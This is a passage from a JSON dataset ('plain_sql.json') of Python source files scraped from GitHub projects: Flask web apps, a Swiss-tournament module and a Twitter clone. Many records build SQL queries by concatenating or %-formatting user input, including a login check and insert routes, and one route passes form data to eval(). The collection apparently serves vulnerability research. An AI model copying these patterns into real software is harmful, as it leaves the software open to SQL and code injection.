issues_delete(issue_id):\n    if not current_user.is_admin:\n        return redirect(url_for(\"error401\"))\n\n    issue_to_delete = Issue.query.get(issue_id)\n    if not issue_to_delete:\n        return redirect(url_for(\"error404\"))\n\n    articles_in_issue = Article.query.filter_by(issue=issue_id)\n\n    # related articles are not distroyed but unassigned\n    for article in articles_in_issue:\n        article.set_issue(0)\n\n    db.session.delete(issue_to_delete)\n    db.session.commit()\n\n    return redirect(url_for(\"issues_index\"))\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ValheKouneli/SkrolliEditor/blob/7aa62683ec3b9228dbc528e9381a121ca61a1f05",
        "file_path": "/application/people/views.py",
        "source": "from flask import redirect, render_template, request, url_for\nfrom flask_login import login_required, current_user\n\nfrom application import app, db\nfrom application.auth.models import User\nfrom application.people.models import Name\nfrom application.people.forms import NameForm\n\n@app.route(\"/people/\", methods=[\"GET\"])\ndef people_index():\n    return render_template(\"/people/list.html\", people = get_people())\n\n@app.route(\"/people/new/\")\n@login_required\ndef people_form():\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm()\n    return render_template(\"/people/new.html\", form = form)\n\n@app.route(\"/people/\", methods=[\"POST\"])\n@login_required\ndef people_create():\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm(request.form)\n\n    if not form.validate():\n        return render_template(\"people/new.html\", form = form)\n\n    u = User(form.name.data, \"\", \"\")\n    db.session().add(u)\n    db.session().commit()\n    u.add_name(form.name.data)\n\n    return redirect(url_for(\"people_index\"))\n\n@app.route(\"/people/<user_id>/edit\", methods=[\"GET\"])\n@login_required\ndef person_edit(user_id):\n    form = NameForm()\n    name = \"\"\n    username = \"\"\n    prsn = User.query.filter_by(id = user_id).first()\n\n    if prsn.username != \"\":\n        username = prsn.username\n\n    name = prsn.name\n\n    names = list(map(lambda name: {\"name\":name.name, \"id\":name.id}, prsn.names))\n    person = {\"id\": user_id, \"name\": name, \"username\": username, \"names\": names}\n\n    return render_template(\"/people/edit.html\", person = person, form = form)\n\n@app.route(\"/people/<user_id>/delete_name/<name_id>\", methods=[\"POST\"])\n@login_required\ndef delete_name(name_id, user_id):\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    name_to_delete = Name.query.filter_by(id = name_id).first()\n    db.session.delete(name_to_delete)\n    db.session.commit()\n    return redirect(url_for(\"person_edit\", user_id=user_id))\n\n@app.route(\"/people/<user_id>\", methods=[\"POST\"])\n@login_required\ndef names_create(user_id):\n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = NameForm(request.form)\n\n    if not form.validate():\n        return render_template(\"/people/edit.html\", person=eval(request.form[\"person\"]), form = form)\n\n    n = Name(form.name.data, user_id)\n\n    db.session().add(n)\n    db.session().commit()\n\n    return redirect(url_for(\"person_edit\", user_id=user_id))\n\n@app.route(\"/people/<user_id>/\", methods=[\"GET\"])\ndef show_tasks(user_id):\n    user = User.query.get(int(user_id))\n    if not user:\n        return redirect(url_for(\"error404\"))\n    \n    name = user.name\n\n    articles_writing = user.get_articles_writing()\n    articles_editing = user.get_articles_editing()\n\n    return render_template(\"people/tasks.html\",\n        articles_writing = articles_writing,\n        articles_editing = articles_editing,\n        posessive_form = \"\" + name + \"'s\",\n        system_name = user.name,\n        person_is = name + \" is\")\n\ndef get_people():\n    people = []\n    ppl = User.query.all()\n    for person in ppl:\n        username = \"\"\n        name = person.name\n        if person.username:\n            username = person.username\n        names = Name.query.filter_by(user_id=person.id)\n        people.append({'id': person.id, 'username': username, 'name': name, 'names': names})\n    return people",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tfalbo/logs_analysis/blob/e4cba29ea89e8cdf0e49c1e64534f8c2dfd4469c",
        "file_path": "/vagrant/forum/forumdb.py",
        "source": "# \"Database code\" for the DB Forum.\n\nimport psycopg2\n\nDBNAME = \"forum\"\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"select content,time from posts order by time desc\")\n  return c.fetchall()\n  db.close()\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"insert into posts values('%s')\" % content)\n  db.commit()\n  db.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cornell-dti/project-samwise/blob/52db72620c549b546540e1f84a29440007ef771a",
        "file_path": "/app/run.py",
        "source": "import json\nimport os\nimport mysql.connector\nfrom flask import Flask, render_template, url_for, redirect, request, session, jsonify, g\n\napp = Flask(__name__)\napp.config.from_object('config')\n\ndef get_db():\n    if not hasattr(g, 'db'):\n        g.db = mysql.connector.connect(user=os.getenv('SAMWISE_USERNAME'), password=os.getenv('SAMWISE_PASSWORD'),\n                                       host=os.getenv('SAMWISE_DB'))\n    return g.db\n\n\n@app.teardown_appcontext\ndef close_db(error):\n    if hasattr(g, 'db'):\n        g.db.close()\n\n\n@app.route(\"/\")\ndef index():\n    if 'netid' in session:\n        app.logger.debug('NetID: ' + session['netid'])\n        return redirect(url_for('calData', userid=session['netid']))\n    return render_template(\"index.html\")\n\n\n@app.route(\"/calendar\")\ndef calendar():\n    return render_template(\"calendar.html\")\n\n\n@app.route(\"/<userid>\")\ndef calData(userid):\n    if 'netid' in session:\n        app.logger.debug('User ID Data For ' + session['netid'])\n        return render_template(\"index.html\", netid=userid)\n    return redirect(url_for('index'))\n\n\n@app.route('/getUserExams/<netId>')\ndef getUserExams(netId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT courseId FROM samwisedb.User WHERE netId = %s', (netId,))\n    courses = [item[0] for item in cursor.fetchall()]\n    data = []\n    for courseId in courses:\n        cursor.execute('SELECT sections, time FROM samwisedb.Exam WHERE courseId = %s', (courseId,))\n        exam = [{'courseId': courseId, 'section': item[0], 'start': item[1]} for item in cursor.fetchall()]\n        data.append(exam)\n    return jsonify(data)\n\n\n@app.route('/getAllCourses')\ndef getAllCourses():\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT courseId FROM samwisedb.Course ORDER BY courseId')\n    data = [item[0] for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/getUserCourses/<netId>')\ndef getUserCourses(netId):\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT courseId FROM samwisedb.User WHERE netId = %s', (netId,))\n    data = [item[0] for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/addCourse/', methods=['POST'])\ndef addCourse():\n    data = request.get_json(force=True)\n    courseId = data['courseId']\n    user = data['user']\n    connection = get_db()\n    cursor = connection.cursor()\n    # TODO: Make sure course exists and use does not already have course\n    cursor.execute('INSERT INTO samwisedb.User(netId, courseId) VALUES (%s, %s)', (user, courseId))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/removeCourse/', methods=['POST'])\ndef removeCourse():\n    data = request.get_json(force=True)\n    courseId = data['courseId']\n    userId = data['userId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.User WHERE (userId, courseId) = (%s, %s)', (userId, courseId))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/getProjects/<userId>')\ndef getProjects(userId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Project WHERE user = %s', (userId,))\n    data = [{'projectId': item[1], 'projectName': item[2], 'date': item[3], 'courseId': item[4]} for item in\n            cursor.fetchall()]\n    for d in data:\n        cursor.execute('SELECT subtaskName FROM samwisedb.Subtask WHERE projectId = %s', (d['projectId'],))\n        subtasks = [item[0] for item in cursor.fetchall()]\n        d['subtasks'] = subtasks\n    return jsonify(data)\n\n\n@app.route('/removeProject/', methods=['POST'])\ndef removeProject():\n    data = request.get_json(force=True)\n    projectId = data['projectId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Project WHERE projectId = %s', (projectId,))\n    cursor.execute('DELETE FROM samwisedb.Subtask WHERE projectId = %s', (projectId,))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/updateProject/', methods=['POST'])\ndef updateProject():\n    data = request.get_json(force=True)\n    projectId = data['projectid']\n    projectName = data['projectname']\n    dueDate = data['duedate']\n    courseId = data['course']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('''\n       UPDATE samwisedb.Project\n       SET projectName=%s, dueDate=%s, courseId=%s\n       WHERE projectId=%s\n    ''', (projectName, dueDate, courseId, projectId))\n    connection.commit()\n    return jsonify(data)\n\n\n@app.route('/addProject/', methods=['POST'])\ndef addProject():\n    data = request.get_json(force=True)\n    userId = data['userId']\n    projectName = data['projectName']\n    courseId = data['courseId']\n    dueDate = data['dueDate']\n    subtasks = data['subtasks']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO samwisedb.Project(userId, projectName, dueDate, courseId) VALUES (%s, %s, %s, %s)',\n                   (userId, projectName, dueDate, courseId))\n    projectId = cursor.lastrowid\n    for subtask in subtasks:\n        cursor.execute('INSERT INTO samwisedb.Subtask(projectId, subtaskName) VALUES (%s, %s)', (projectId, subtask))\n    connection.commit()\n    return jsonify([projectId])\n\n\n@app.route('/getEvents/<userid>')\ndef getEvents(userid):\n    connection = get_db()\n\n    cursor = connection.cursor()\n\n    query = \"SELECT DISTINCT * FROM samwisedb.Event WHERE user = \\\"\" + userid + \"\\\";\"\n    cursor.execute(query)\n\n    data = [{\"eventName\": str(item[2]), \"startTime\": str(item[3]), \"endTime\": str(item[4]), \"tagId\": str(item[5])} for\n            item in cursor.fetchall()]\n\n    return json.dumps(data)\n\n\n@app.route('/removeEvent/', methods=['POST'])\ndef removeEvent():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        eventId = data['eventId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            query = \"DELETE FROM samwisedb.Event WHERE eventId = \\\"\" + eventId + \"\\\";\"\n            print(query)\n            cursor.execute(query)\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return json.dumps([])\n\n\n@app.route('/addEvent/', methods=['POST'])\ndef addEvent():\n    event_id = -1\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        user = data['user']\n        eventName = data['eventName']\n        startTime = data['startTime']\n        endTime = data['endTime']\n        tagId = data['tagId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            query = \"insert into samwisedb.Event(user, eventName, startTime, endTime, tagId) values (\\\"\" + user + \"\\\", \\\"\" + eventName + \"\\\", \\\"\" + startTime + \"\\\", \\\"\" + endTime + \"\\\", \\\"\" + tagId + \"\\\");\"\n            print(query)\n            cursor.execute(query)\n            connection.commit()\n            event_id = cursor.lastrowid\n        finally:\n            print (\"DONE\")\n    return json.dumps([event_id])\n\n\n@app.route('/updateEvent/', methods=['POST'])\ndef updateEvent():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        eventId = data['eventId']\n        eventName = data['eventName']\n        startTime = data['startTime']\n        endTime = data['endTime']\n        tagId = data['tagId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\"\"\"\n               UPDATE samwisedb.Event\n               SET eventName=%s, startTime=%s, endTime=%s, tagId=%s\n               WHERE eventId=%s\n            \"\"\", (eventName, startTime, endTime, tagId, eventId))\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return json.dumps([])\n\n\n@app.route('/getTasks/<userId>', methods=['GET'])\ndef getTasks(userId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Task WHERE user = %s', (userId,))\n    data = [{\n        'user': item[0],\n        'taskId': item[1],\n        'taskName': item[2],\n        'courseId': item[3],\n        'tag': item[4],\n        'dueDate': item[5],\n        'details': item[6]\n    } for item in cursor.fetchall()]\n\n    return jsonify(data)\n\n\n@app.route('/removeTask/', methods=['POST'])\ndef removeTask():\n    data = request.get_json(force=True)\n    taskId = data['taskid']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Task WHERE taskId = %s', taskId)\n    connection.commit()\n\n    return json.dumps([])\n\n\n@app.route('/addTask/', methods=['POST'])\ndef addTaskCourse():\n    task_id = -1\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        userid = data['userid']\n        taskname = data['taskname']\n        course = data['course']\n        duedate = data['duedate']\n        details = data['details']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            query = \"INSERT into samwisedb.Task(user, taskName, courseId, dueDate, details) values (\\\"\" + userid + \"\\\", \\\"\" + taskname + \"\\\", \\\"\" + course + \"\\\", \\\"\" + duedate + \"\\\", \\\"\" + details + \"\\\");\"\n            print(query)\n            cursor.execute(query)\n            connection.commit()\n            task_id = cursor.lastrowid\n        finally:\n            print (\"DONE\")\n    return json.dumps([task_id])\n\n\n@app.route('/updateTask/', methods=['POST'])\ndef updateTask():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        taskid = data['taskid']\n        taskname = data['taskname']\n        details = data['details']\n        duedate = data['duedate']\n        course = data['course']\n\n        taskid = int(taskid)\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\"\"\"\n               UPDATE samwisedb.Task\n               SET taskName=%s, dueDate=%s, courseId=%s, details=%s\n               WHERE taskId=%s\n            \"\"\", (taskname, duedate, course, details, taskid))\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return json.dumps([])\n\n\n@app.route('/exams/<course_id>')\ndef getExams(course_id):\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT time FROM samwisedb.Exam WHERE courseId = %s', (course_id,))\n    data = [{'course_id': course_id, 'start': item[0]} for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/courses/<courseId>')\ndef getClassInfo(courseId):\n    # Open the connection to database\n    connection = get_db()\n\n    cursor = connection.cursor()\n    cursor.execute('SELECT startTime FROM samwisedb.Course WHERE courseId = %s', courseId)\n    data = [{\"course\": courseId + \" Class\", \"start\": str(item[0])} for item in cursor.fetchall()]\n    return json.dumps(data)\n\n\n@app.route('/addSubtask/', methods=['POST'])\ndef addSubtask():\n    data = request.get_json(force=True)\n    projectId = data['projectId']\n    subtask = data['subtask']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO samwisedb.Subtask(projectId, subtask) VALUES (%s, %s)', (projectId, subtask))\n    subtaskId = cursor.lastrowid\n    connection.commit()\n    return jsonify([subtaskId])\n\n\n@app.route('/removeSubtask/', methods=['POST'])\ndef removeSubtask():\n    data = request.get_json(force=True)\n    subtaskId = data['subtaskId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Subtask WHERE subtaskId = %s', (subtaskId,))\n    connection.commit()\n    return jsonify([subtaskId])\n\n\n@app.route('/updateSubtask/', methods=['POST'])\ndef updateSubtask():\n    data = request.get_json(force=True)\n    subtaskId = data['subtaskId']\n    subtaskName = data['subtaskName']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('UPDATE samwisedb.Subtask SET subtaskName = %s WHERE subtaskId = %s', (subtaskName, subtaskId))\n    connection.commit()\n    return jsonify([subtaskName])\n\n\n@app.route('/getColor/<name>')\ndef getColor(name):\n    return app.config['COLORS'][hash(name) % len(app.config['COLORS'])]\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ShaominLi/Twitter_project/blob/7794760e35f783123c31fb1f4bb80fcd3d22c43c",
        "file_path": "/modules/comment.py",
        "source": "from modules import sql\n\n\nclass Comment:\n    def __init__(self,conn):\n        self.conn=conn;\n    \n    def getCommentsByUser(self,userid):\n        sqlText=\"select comment from comments order by date desc where userid=%d\"%(userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getCommentsByPostid(self,postid,userid):\n        sqlText=\"select (select Count(*) from comment_like where comments.commentid = comment_like.commentid) as like,(select Count(*) from comment_like where comments.commentid = comment_like.commentid and comment_like.userid=%d) as flag,commentid,name,comment from users,comments where users.userid=comments.userid and postid=%d order by date desc;\"%(userid,postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n    def getCommentsLike(self,commentid):\n        sqlText=\"select userid from comment_like where commentid=%d\"%(commentid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\t\n    def insertData(self,comment,userid,postid):\n        sqlText=\"insert into comments(comment,userid,date,postid) values('%s',%d,current_timestamp(0),%d);\"%(comment,userid,postid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def deleteComment(self,commentid):\n        sqlText=\"delete from comments where commentid=%d\"%(commentid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def likeComments(self,commentid,userid):\n        sqlText=\"insert into comment_like values(%d,%d);\"%(userid,commentid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def dislikeComments(self,commentid,userid):\n        sqlText=\"delete from comment_like where commentid=%d and userid=%d;\"%(commentid,userid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ShaominLi/Twitter_project/blob/7794760e35f783123c31fb1f4bb80fcd3d22c43c",
        "file_path": "/modules/post.py",
        "source": "from modules import sql\n\n\nclass Post:\n    def __init__(self,conn):\n        self.conn=conn;\n\n    def getAllPosts(self,userid):\n        sqlText=\"select users.name,post.comment,post.postid,(select Count(*) from post_like \\\n                where post.postid = post_like.postid) as like,\\\n                (select Count(*) from post_like where post.postid =post_like.postid \\\n                and post_like.userid=%d) as flag from users,post \\\n                where post.userid=users.userid and (post.userid in \\\n                (select friendid from friends where userid =%d) or post.userid=%d )\\\n                order by post.date desc;\"%(userid,userid,userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getPostsByPostid(self,postid):\n        sqlText=\"select users.name,post.comment from users,post where \\\n                users.userid=post.userid and post.postid=%d\"%(postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getPostLike(self,postid):\n        sqlText=\"select userid from post_like where postid=%d\"%(postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n    def likePost(self,postid,userid):\n        sqlText=\"insert into post_like values(%d,%d);\"%(postid,userid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def dislikePost(self,postid,userid):\n        sqlText=\"delete from post_like where postid=%d and userid=%d;\"%(postid,userid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def insertData(self,userid,post):\n        sqlText=\"insert into post(userid,date,comment) \\\n                values(%d,current_timestamp(0),'%s');\"%(userid,post);\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n\n    def deletePost(self,postid):\n        sqlText=\"delete from post where post.postid=%d\"%(postid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ShaominLi/Twitter_project/blob/7794760e35f783123c31fb1f4bb80fcd3d22c43c",
        "file_path": "/modules/sql.py",
        "source": "import psycopg2\n\n\n\n#\ndef connectDB(dbname,uname,psw):\n    #conn=psycopg2.connect(database=\"test\",user=\"lishaomin\",password=\"19931004\",host=\"127.0.0.1\",port=\"5432\")\n    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=\"127.0.0.1\",port=\"5432\")\n    return conn\n\n\n#\ndef queryDB(conn,sql_select):\n    print(\"query data\")\n    cur=conn.cursor()\n    #sql_select=\"select * from users;\"\n    cur.execute(sql_select)\n    rows=cur.fetchall()\n    #for row in rows:\n    #print (\"user:%s\"%(row[1]))\n    return rows\n\n\n\n#\ndef insertDB(conn,sql_insert):\n    cur=conn.cursor()\n    result=cur.execute(sql_insert)\n    conn.commit()\n    print(\"insert data successfull\")\n    return result\n\n#delete data\ndef deleteDB(conn,sql_delete):\n    cur=conn.cursor()\n    result=cur.execute(sql_delete)\n    conn.commit()\n    print(\"delete data successfull\")\n    return result\n\n\n#update data\ndef updateDB(conn,sql_update):\n    cur=conn.cursor()\n    result=cur.execute(sql_update)\n    conn.commit()\n    print(\"update data successfull\")\n    return result\n\n\n#\ndef closeDB(conn):\n    conn.close()\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ShaominLi/Twitter_project/blob/7794760e35f783123c31fb1f4bb80fcd3d22c43c",
        "file_path": "/modules/users.py",
        "source": "from modules import sql\n\nclass Users:\n    def __init__(self,conn=None,name=None,password=None,email=None,country=None):\n        self.name=name\n        self.password=password\n        self.email=email\n        self.country=country\n        self.conn=conn\n\n    def clean(self):\n        self.name=None;\n        self.password=None;\n        self.email=None;\n        self.count=None;\n \n\n    def userLogin(self):\n\n        sqlName=\"select count(*) from users where name='%s' and \\\n                password='%s';\"%(self.name,self.password)\n        checkName=sql.queryDB(self.conn,sqlName)\n\n        result=checkName[0][0]\n        if result == 0:\n            self.clean()\n            return False\n        else:\n            return True\n\n\n    def userApply(self):\n        t_sql_insert=\"insert into \\\n                users(name,password,email,country,inscription_date) \\\n                values('{name}','{psw}','{email}','{country}',current_timestamp(0));\"\n        sql_insert=t_sql_insert.format(name=self.name,psw=self.password,\\\n                email=self.email,country=self.country)\n\n        sqlName=\"select count(*) from users where name='%s';\"%(self.name)\n        checkName=sql.queryDB(self.conn,sqlName)\n    \n        #no name\n        if checkName[0][0] == 0:\n            sql.insertDB(self.conn,sql_insert)\n            return True\n        else:\n            return False\n\n    def getUserID(self):\n        sqlName=\"select userid from users where name='%s';\"%(self.name)\n        userid=sql.queryDB(self.conn,sqlName)\n        return userid[0][0];\n\n    def getAllPosts(self):\n        sqlText=\"select comment from post where userid=%d order by date;\"\n        allposts=sql.queryDB(self.conn,sqlText)\n        return allposts;\n\n\n    def getAllComments(self):\n        sqlText=\"select comment from comments where userid=%d order by date;\"\n        allposts=sql.queryDB(self.conn,sqlText)\n        return allposts;\n\n    def getAllInformation(self,userid):\n        sqlText=\"select name,password,email,country from users where userid=%d;\"%(userid)\n        information=sql.queryDB(self.conn,sqlText)\n        return information;\n\n\n    def modifyUserInfo(self,userid,flag):\n        sqlText=\"update users \\\n                set name='%s',password='%s',email='%s',country='%s' \\\n                where userid='%d';\"%(self.name,self.password,self.email,self.country,userid)\n        if(flag==1): \n            sqlName=\"select count(*) from users where name='%s';\"%(self.name)\n            checkName=sql.queryDB(self.conn,sqlName)\n            #no name\n            if checkName[0][0] == 0:\n                sql.updateDB(self.conn,sqlText)\n                return True\n            else:\n                return False\n        else:\n            sql.updateDB(self.conn,sqlText)\n            return True;\n\n    def followFriends(self,userid,friendid):\n        sqlText=\"insert into friends values(%d,%d);\"%(friendid,userid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def cancelFollow(self,userid,friendid):\n        sqlText=\"delete from friends where userid=%d and friendid=%d;\"%(userid,friendid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def getUsers(self,userid):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%d) as follow \\\n                from users;\"%(userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n\n    def getUsersByName(self,userid,username):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%d) as follow \\\n                from users where users.name='%s';\"%(userid,username)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n\n\n\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cosileone/TimeIsMoneyFriend-API/blob/f1e19cac71b85369ed69cede5061baaf4f937f5e",
        "file_path": "/timf/api/views.py",
        "source": "from flask import jsonify, request\nfrom . import api\n\nfrom run import mysql\n\n\n@api.route('/items', methods=['GET'])\ndef list_items():\n    sql = '''SELECT id, name_enus from tblDBCItem where auctionable = true;'''\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchall()\n\n    results = []\n    for row in data:\n        item = {}\n        for tup in zip([column[0] for column in cursor.description], row):\n            item[tup[0]] = tup[1]\n\n        results.append(item)\n\n    return jsonify({\"items\": results})\n\n\n@api.route('/items/<int:item_id>', methods=['GET'])\ndef get_item(item_id):\n    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = {} AND auctionable = true;'''.format(item_id)\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchone()\n\n    if data:\n        item = {}\n        for tup in zip([column[0] for column in cursor.description], data):\n            item[tup[0]] = tup[1]\n    else:\n        return jsonify({\"error\": \"item not found\"}), 404\n\n    return jsonify(item)\n\n\n@api.route('/item/', methods=['GET'])\ndef resolve_item_name():\n    item_name = request.args.get('name')\n    sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE \"%{}%\" '''.format(item_name)\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchall()\n\n    if data:\n        results = []\n        for row in data:\n            item = {}\n            for tup in zip([column[0] for column in cursor.description], row):\n                item[tup[0]] = tup[1]\n\n            results.append(item)\n    else:\n        return jsonify({\"error\": \"item not found\"}), 404\n\n    return jsonify({\"items\": results})\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tdnelson2/tournament-db/blob/79e5efb88d520e673ec185fb9e95ff326abf62c0",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\nimport bleach\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM matches;\")\n    db.commit()\n    db.close\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    deleteMatches()\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM players;\")\n    db.commit()\n    db.close\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT COUNT(*) FROM players;\")\n    rows = c.fetchall()\n    db.commit()\n    db.close\n    return rows[0][0]\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO players (name) values (%s)\", (bleach.clean(name),))\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM standings\")\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    w = str(winner)\n    l = str(loser)\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO matches values (%s, %s)\" % (w, l))\n    db.commit()\n    db.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM pairup;\")\n    rows = c.fetchall()\n    db.close()\n    return list(reversed(rows))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tdnelson2/tournament-db/blob/52b0c20f2e00e403d98ab567d04b5ddd758b0792",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM matches;\")\n    db.commit()\n    db.close\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    deleteMatches()\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM players;\")\n    db.commit()\n    db.close\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT COUNT(*) FROM players;\")\n    rows = c.fetchone()\n    db.close\n    return rows[0]\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by 